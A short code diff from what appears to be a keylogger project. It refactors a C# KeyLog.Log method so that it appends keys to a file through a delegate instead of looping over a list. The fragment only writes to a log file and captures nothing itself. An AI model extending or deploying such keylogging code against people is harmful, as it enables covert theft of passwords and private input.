@@ -8,16 +8,13 @@ namespace keylogger.keylog
 {
     public static class KeyLog
     {
-        public static bool Log(string path, List<Key> keys)
+        public static bool Log(string path, Action<StreamWriter> SaveKeys)
         {
             try
             {
                 using (var sw = new StreamWriter(path, true, Encoding.UTF8))
                 {
-                    foreach (var key in keys)
-                    {
-                        sw.WriteLine(key);
-                    }
+                    SaveKeys(sw);
                 }
                 return true;
             }
